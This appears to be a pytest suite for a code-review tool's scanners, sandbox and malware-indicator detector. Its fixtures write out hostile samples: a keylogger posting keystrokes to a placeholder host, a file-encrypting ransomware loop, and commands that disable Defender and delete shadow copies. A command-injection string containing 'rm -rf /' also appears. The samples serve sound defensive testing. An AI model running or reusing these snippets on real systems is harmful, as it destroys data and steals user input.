import os
from pathlib import Path

import pytest
from conftest import SAMPLES

from app.agents.patch_scope import compute_metrics
from app.config import Settings
from app.ingest.indexer import build_index
from app.tools.diffing import compare_texts, diff_trees, enclosing_function
from app.tools.sandbox import BlockedBackend, LocalRestrictedBackend, select_backend
from app.tools.scanners import dedupe, run_bandit, run_builtin_secrets, run_osv, run_suspicious
from app.tools.suspicious import scan_python
from app.tools.testing import parse_junit, run_pytest

# --------------------------------------------------------------------------- diffing / scope


def test_formatting_only_hunk_detected():
    ch = compare_texts("a.py", "x = 'a'\ny = 1\n", 'x = "a"\ny = 1\n')
    assert ch.formatting_only_hunks == 1 and ch.added == 1 and ch.removed == 1
    assert ch.diff.startswith("--- a/a.py")


def test_enclosing_function():
    src = "def a():\n    return 1\n\nclass K:\n    def m(self):\n        x = 1\n        return x\n"
    assert enclosing_function(src, 6) == "K.m"
    assert enclosing_function(src, 3) is None


def test_overbroad_patch_metrics():
    root = SAMPLES / "overbroad-patch"
    changes = diff_trees(root / "before", root / "after")
    m, signals = compute_metrics(root / "before", changes, "restock_needed() returns False when quantity equals reorder level", None, "")
    assert m.implicated_functions == ["restock_needed"]
    unrelated = " ".join(m.unrelated_function_candidates)
    assert "total_value" in unrelated and "fetch_supplier_price" in unrelated and "format_report" in unrelated
    assert any("requests" in d for d in m.new_dependencies)
    assert any("InventoryValidator" in d for d in m.new_definitions)
    assert m.duplicated_blocks, "duplicated validation logic should be detected"
    assert all(0 <= cf.change_ratio <= 1 for cf in m.changed_functions)


# --------------------------------------------------------------------------- suspicious / scanners


def test_suspicious_rules_on_fixture():
    idx = build_index(SAMPLES / "insecure-notes/repo")
    run, findings = run_suspicious(idx)
    rules = {f.rule_id for f in findings}
    assert {"obfuscated-exec", "env-exfiltration", "install-hook"} <= rules
    assert all(not f.is_malware_confirmed for f in findings)
    assert all("not confirmed malicious" in f.description for f in findings)


def test_benign_code_not_flagged_high():
    findings = scan_python("ok.py", "import subprocess\nsubprocess.run(['ls', '-l'], check=True)\nprint(eval('1+1'))\n")
    assert not [f for f in findings if f.severity in ("high", "critical")]


def test_builtin_secret_scanner_masks_values():
    idx = build_index(SAMPLES / "insecure-notes/repo")
    _, findings = run_builtin_secrets(idx)
    assert any(f.rule_id == "aws-access-key-id" for f in findings)
    assert all("AKIAIOSFODNN7EXAMPLE" not in (f.snippet + f.description) for f in findings)


def test_bandit_runs_on_fixture():
    root = SAMPLES / "insecure-notes/repo"
    run, findings = run_bandit(root, build_index(root), 120)
    if run.status == "unavailable":
        pytest.skip("bandit not installed")
    assert run.status == "completed" and run.version
    ids = {f.rule_id for f in findings}
    assert {"B602", "B301"} & ids


def test_dedupe_merges_overlapping_rules():
    from app.core.models import Confidence, SecurityFinding, Severity
    a = SecurityFinding(id="1", scanner="bandit", category="static_analysis", rule_id="B602", title="t", severity=Severity.high, confidence=Confidence.high, file_path="x.py", line=3)
    b = SecurityFinding(id="2", scanner="semgrep", category="static_analysis", rule_id="subprocess-shell-true", title="t", severity=Severity.medium, confidence=Confidence.medium, file_path="x.py", line=3)
    out = dedupe([a, b])
    assert len(out) == 1 and "semgrep" in out[0].references[0]


def test_osv_reports_network_failure_honestly(settings):
    import httpx
    idx = build_index(SAMPLES / "insecure-notes/repo")
    settings.osv_enabled = True

    def broken():
        return httpx.Client(transport=httpx.MockTransport(lambda r: (_ for _ in ()).throw(httpx.ConnectError("offline"))))
    run, findings = run_osv(idx, settings, client_factory=broken)
    assert run.status == "failed" and findings == []


def test_osv_parses_results(settings):
    import httpx
    idx = build_index(SAMPLES / "insecure-notes/repo")
    settings.osv_enabled = True

    def handler(req: httpx.Request):
        if req.url.path.endswith("querybatch"):
            return httpx.Response(200, json={"results": [{"vulns": [{"id": "GHSA-test-0001"}]}, {}, {}, {}]})
        return httpx.Response(200, json={"summary": "Arbitrary code execution", "database_specific": {"severity": "CRITICAL"}, "aliases": ["CVE-2020-1747"]})
    run, findings = run_osv(idx, settings, client_factory=lambda: httpx.Client(transport=httpx.MockTransport(handler)))
    assert run.status == "completed" and len(findings) == 1
    assert findings[0].severity == "critical" and "CVE-2020-1747" in findings[0].description


# --------------------------------------------------------------------------- sandbox / test runner


def _mini_repo(tmp_path: Path, body: str) -> Path:
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "test_x.py").write_text(body)
    return tmp_path


def test_backend_selection(settings):
    assert isinstance(select_backend(settings, allow_local=False), BlockedBackend)
    assert isinstance(select_backend(settings, allow_local=True), LocalRestrictedBackend)
    disabled = Settings(data_dir=settings.data_dir, execution_backend="disabled")
    assert select_backend(disabled, allow_local=True).name == "blocked"
    docker_only = Settings(data_dir=settings.data_dir, execution_backend="docker", docker_image="patchpilot-does-not-exist:0")
    assert select_backend(docker_only, allow_local=True).name == "blocked"  # never silently falls back


def test_blocked_backend_executes_nothing(tmp_path, settings):
    repo = _mini_repo(tmp_path, "open('ran.txt','w').write('x')\ndef test_a(): pass\n")
    run = run_pytest(select_backend(settings, False), repo, "b")
    assert run.status == "blocked" and run.passed == 0
    assert not (repo / "ran.txt").exists()


def test_local_sandbox_isolation(tmp_path, settings, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-should-never-leak-1234567890")
    repo = _mini_repo(tmp_path, (
        "import os, socket, pytest\n"
        "def test_ok(): assert True\n"
        "def test_fails(): assert 1 == 2\n"
        "def test_no_secrets(): assert not [k for k in os.environ if k.startswith('ANTHROPIC')]\n"
        "def test_network_blocked():\n"
        "    with pytest.raises(PermissionError):\n"
        "        socket.create_connection(('93.184.216.34', 80), timeout=2)\n"
    ))
    run = run_pytest(LocalRestrictedBackend(settings), repo, "iso")
    outcomes = {t.nodeid.split("::")[-1]: t.outcome for t in run.tests}
    assert outcomes == {"test_ok": "passed", "test_fails": "failed", "test_no_secrets": "passed", "test_network_blocked": "passed"}
    assert run.passed == 3 and run.failed == 1 and run.status == "completed"
    assert "sk-ant-should-never-leak" not in run.output_tail


def test_local_sandbox_timeout(tmp_path, settings):
    repo = _mini_repo(tmp_path, "import time\ndef test_slow(): time.sleep(30)\n")
    run = run_pytest(LocalRestrictedBackend(settings), repo, "slow", timeout=4)
    assert run.status == "timeout" and run.duration_seconds < 20


@pytest.mark.skipif(os.name != "nt", reason="Windows Job Object process cap")
def test_job_object_limits_process_count(tmp_path, settings):
    settings.sandbox_max_processes = 2
    repo = _mini_repo(tmp_path, (
        "import subprocess, sys\n"
        "def test_spawn():\n"
        "    procs = [subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(5)']) for _ in range(4)]\n"
    ))
    run = run_pytest(LocalRestrictedBackend(settings), repo, "fork")
    assert run.failed == 1 or run.errors == 1  # spawning beyond the cap is refused


def test_unsafe_pytest_target_rejected(tmp_path, settings):
    with pytest.raises(ValueError):
        run_pytest(LocalRestrictedBackend(settings), tmp_path, "x", ["--rootdir=/", "tests"])
    with pytest.raises(ValueError):
        run_pytest(LocalRestrictedBackend(settings), tmp_path, "x", ["tests; rm -rf /"])


def test_parse_junit(tmp_path):
    xml = tmp_path / "j.xml"
    xml.write_text(
        '<testsuites><testsuite><testcase classname="tests.test_a" name="test_ok" time="0.1"/>'
        '<testcase classname="tests.test_a" name="test_bad"><failure message="assert 1 == 2">trace</failure></testcase>'
        '<testcase classname="tests.test_a" name="test_skip"><skipped message="no"/></testcase>'
        '<testcase classname="" name="tests.test_b"><error message="collection failure">ImportError</error></testcase>'
        "</testsuite></testsuites>"
    )
    res = {t.nodeid: t.outcome for t in parse_junit(xml)}
    assert res == {"tests.test_a::test_ok": "passed", "tests.test_a::test_bad": "failed", "tests.test_a::test_skip": "skipped", "tests.test_b": "error"}


def test_missing_dependencies_are_stubbed_so_pure_logic_is_testable(tmp_path, settings):
    """Mirrors a real-world repo: heavy deps imported at module top, pure logic underneath."""
    (tmp_path / "tests").mkdir()
    (tmp_path / "helpers").mkdir()
    (tmp_path / "helpers" / "__init__.py").write_text("")
    (tmp_path / "helpers" / "text.py").write_text("import fitz\n\ndef clean(s):\n    return s.strip().lower()\n")
    (tmp_path / "app.py").write_text(
        "from flask import Flask, render_template\n"
        "from flask_sqlalchemy import SQLAlchemy\n"
        "from sentence_transformers import SentenceTransformer, util\n"
        "import numpy_not_installed_xyz as npx\n"
        "from helpers.text import clean\n"
        "app = Flask(__name__)\n"
        "app.config['SECRET_KEY'] = 'x'\n"
        "db = SQLAlchemy(app)\n"
        "model = SentenceTransformer('all-MiniLM-L6-v2')\n\n"
        "class User(db.Model):\n"
        "    id = db.Column(db.Integer, primary_key=True)\n\n"
        "@app.route('/')\n"
        "def index():\n"
        "    return render_template('index.html')\n\n"
        "def score(level, years):\n"
        "    if level >= 3 and years > 5:\n"
        "        return 100\n"
        "    return 50\n"
    )
    (tmp_path / "tests" / "test_app.py").write_text(
        "import app\n\n"
        "def test_pure_logic():\n    assert app.score(3, 6) == 100 and app.score(3, 5) == 50\n\n"
        "def test_decorated_view_is_real_function():\n    assert callable(app.index) and app.index.__name__ == 'index'\n\n"
        "def test_local_module_is_real():\n    assert app.clean('  Hi ') == 'hi'\n"
    )
    idx = build_index(tmp_path)
    assert {"flask", "flask_sqlalchemy", "sentence_transformers", "fitz", "numpy_not_installed_xyz"} <= set(idx.facts.third_party_imports)
    assert "helpers" not in idx.facts.third_party_imports and "app" not in idx.facts.third_party_imports
    assert "numpy_not_installed_xyz" in idx.facts.missing_imports and "pytest" not in idx.facts.missing_imports

    without = run_pytest(LocalRestrictedBackend(settings), tmp_path, "nostub")
    assert without.errors >= 1 and without.passed == 0  # ModuleNotFoundError, as in the real report

    run = run_pytest(LocalRestrictedBackend(settings), tmp_path, "stub", stubs=idx.facts.third_party_imports)
    assert run.status == "completed" and run.passed == 3 and run.failed == 0 and run.errors == 0, run.output_tail
    assert {"fitz", "sentence_transformers", "numpy_not_installed_xyz"} <= set(run.stubbed_modules)
    assert "pytest" not in run.stubbed_modules  # installed packages are never replaced


def test_first_error_line_extraction():
    from app.agents.reproduction import _first_error
    out = "stuff\nE   ModuleNotFoundError: No module named 'fitz'\nmore"
    assert _first_error(out) == "ModuleNotFoundError: No module named 'fitz'"
    assert _first_error("nothing here") == "collection/import error"


def test_one_unloadable_test_file_does_not_hide_other_results(tmp_path, settings):
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "smoke_script.py").write_text("")
    (tmp_path / "tests" / "test_broken.py").write_text("import os\nos.listdir('does-not-exist')\n")
    (tmp_path / "tests" / "test_ok.py").write_text("def test_a(): assert True\ndef test_b(): assert True\n")
    run = run_pytest(LocalRestrictedBackend(settings), tmp_path, "mixed")
    assert run.passed == 2 and run.errors == 1


def test_collection_error_shows_real_reason(tmp_path):
    xml = tmp_path / "j.xml"
    xml.write_text('<testsuites><testsuite><testcase classname="" name="tests.smoke_test"><error message="collection failure">'
                   "tests\\smoke_test.py:144: in &lt;module&gt;\nE   FileNotFoundError: [WinError 3] path not found: 'uploads'</error></testcase></testsuite></testsuites>")
    msg = parse_junit(xml)[0].message
    assert msg.startswith("Could not load this test file — FileNotFoundError")


def test_plain_language_style_applies_to_all_agents_but_repo_understanding():
    from app.agents import bug_investigation, patch_scope, repair, repo_understanding, reporting, reproduction, verification
    for prompt in (bug_investigation.SYSTEM, bug_investigation.SYSTEM_DISCOVERY, patch_scope.SYSTEM, repair.SYSTEM,
                   reporting.SYSTEM, reproduction.SYSTEM, verification.TRIAGE_SYSTEM, verification.INTERPRET_SYSTEM):
        assert "Plain English and short sentences" in prompt
    assert "Plain English" not in repo_understanding.SYSTEM


# --------------------------------------------------------------------------- malware indicators

def _malware_repo(tmp_path):
    (tmp_path / "keylog.py").write_text(
        "import requests\nfrom pynput import keyboard\n\ndef on_press(k):\n    requests.post('https://example.invalid', data=str(k))\n\n"
        "keyboard.Listener(on_press=on_press)\n")
    (tmp_path / "inject.py").write_text("import ctypes\nk = ctypes.windll.kernel32\nbuf = k.VirtualAlloc(0, 4096, 0x3000, 0x40)\nk.CreateRemoteThread(0)\n")
    (tmp_path / "persist.py").write_text('KEY = r"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"\n')
    (tmp_path / "evade.ps1").write_text("Set-MpPreference -DisableRealtimeMonitoring $true\nvssadmin delete shadows /all\n")
    (tmp_path / "exfil.py").write_text('URL = "https://discord.com/api/webhooks/1/abc"\n')
    (tmp_path / "ransom.py").write_text(
        "import os\nfrom cryptography.fernet import Fernet\nf = Fernet(Fernet.generate_key())\n"
        "for root, _, files in os.walk('/home'):\n    for n in files:\n        p = os.path.join(root, n)\n"
        "        open(p + '.locked', 'wb').write(f.encrypt(open(p, 'rb').read()))\n        os.remove(p)\n")
    (tmp_path / "trojan.py").write_text("access = 'user'\nif access != 'none‮ ⁦':  # admin\n    pass\n", encoding="utf-8")
    (tmp_path / "loader.js").write_text("eval(atob('Y29uc29sZS5sb2coMSk='));\n")
    (tmp_path / "helper.exe").write_bytes(b"MZ\x90\x00" + b"\x00" * 64)
    (tmp_path / "requirements.txt").write_text("reqeusts==1.0.0\nflask==3.0.0\n")
    return tmp_path


def test_malware_indicators_detected(tmp_path):
    idx = build_index(_malware_repo(tmp_path))
    _, findings = run_suspicious(idx)
    rules = {f.rule_id for f in findings}
    expected = {"keylogger", "shellcode-injection", "persistence", "defense-evasion", "exfil-endpoint", "ransomware-pattern",
                "trojan-source", "js-obfuscated-exec", "embedded-binary", "typosquat-dependency"}
    assert expected <= rules, expected - rules
    assert not any(f.is_malware_confirmed for f in findings)
    squat = next(f for f in findings if f.rule_id == "typosquat-dependency")
    assert "requests" in squat.title and "flask" not in squat.title


def test_benign_repo_has_no_malware_indicators():
    idx = build_index(SAMPLES / "buggy-shop/repo")
    _, findings = run_suspicious(idx)
    assert findings == []


def test_lookalike_name_detection():
    from app.tools.malware import _lev1
    assert _lev1("reqeusts", "requests") and _lev1("requets", "requests") and _lev1("numpyy", "numpy")
    assert not _lev1("requests", "requests") and not _lev1("flask", "django")


def test_clamav_reported_honestly_when_missing(tmp_path, monkeypatch):
    import app.tools.malware as m
    monkeypatch.setattr(m.shutil, "which", lambda name: None)
    run, findings = m.run_clamav(tmp_path, 10)
    assert run.status == "unavailable" and "ClamAV" in run.message and findings == []


def test_malware_review_verdicts(tmp_path, settings):
    from conftest import FakeLLM

    from app.agents.base import AgentContext
    from app.agents.verification import malware_review
    from app.core.models import SecurityReport
    from app.tools.sandbox import BlockedBackend
    root = _malware_repo(tmp_path)
    idx = build_index(root)
    _, findings = run_suspicious(idx)

    def ctx(llm):
        return AgentContext("job_0000000002", settings, llm, None, idx, BlockedBackend("t"), lambda a, m: None)

    # without AI: deterministic baseline, honest limitations
    rep = SecurityReport(scanners=[], findings=list(findings))
    m = malware_review(ctx(FakeLLM(available=False)), rep, idx)
    assert m.overall == "suspicious_needs_review" and m.ai_status == "unavailable"
    assert "Keyboard capture, screen or clipboard grabbing" in m.indicators_matched
    assert any("Static checks only" in x for x in m.limitations)

    # with AI: verdict taken from the review, unknown finding ids dropped
    def review(prompt):
        import re
        ids = re.findall(r"finding_id=(sec_[a-f0-9]+)", prompt)
        return {"overall": "likely_malicious", "summary": "Keylogger sends keystrokes to a server.",
                "items": [{"finding_id": i, "verdict": "likely_malicious", "explanation": "x"} for i in ids[:2]]
                + [{"finding_id": "sec_madeup", "verdict": "benign", "explanation": "x"}],
                "recommended_actions": ["Do not run this code."]}
    rep2 = SecurityReport(scanners=[], findings=list(findings))
    m2 = malware_review(ctx(FakeLLM(script={"MalwareDraft": [review]})), rep2, idx)
    assert m2.overall == "likely_malicious" and m2.ai_status == "completed" and len(m2.items) == 2
    assert rep2.malware is m2

    # clean repo: no AI call needed, explicit "no indicators" wording
    clean = build_index(SAMPLES / "buggy-shop/repo")
    m3 = malware_review(AgentContext("job_0000000003", settings, FakeLLM(available=False), None, clean, BlockedBackend("t"), lambda a, m: None),
                        SecurityReport(scanners=[], findings=[]), clean)
    assert m3.overall == "no_malicious_indicators" and m3.ai_status == "not_needed" and "None of the" in m3.summary


def test_patch_recheck_skips_semgrep_by_default(tmp_path, settings):
    import shutil

    from conftest import FakeLLM

    from app.agents.base import AgentContext
    from app.agents.verification import _patch_scan
    from app.tools.sandbox import BlockedBackend
    root = tmp_path / "r"
    shutil.copytree(SAMPLES / "buggy-shop/repo", root)
    (root / "shop/pricing.py").write_text((root / "shop/pricing.py").read_text() + "\nimport pickle\ndef load(b):\n    return pickle.loads(b)\n")
    settings.disabled_scanners = ""
    ctx = AgentContext("job_0000000004", settings, FakeLLM(), None, build_index(root), BlockedBackend("t"), lambda a, m: None)
    introduced, status = _patch_scan(ctx, root, {"shop/pricing.py"}, [])
    assert any(s.startswith("semgrep: skipped") for s in status)
    assert any(f.rule_id == "B301" for f in introduced)  # Bandit still catches the risky change
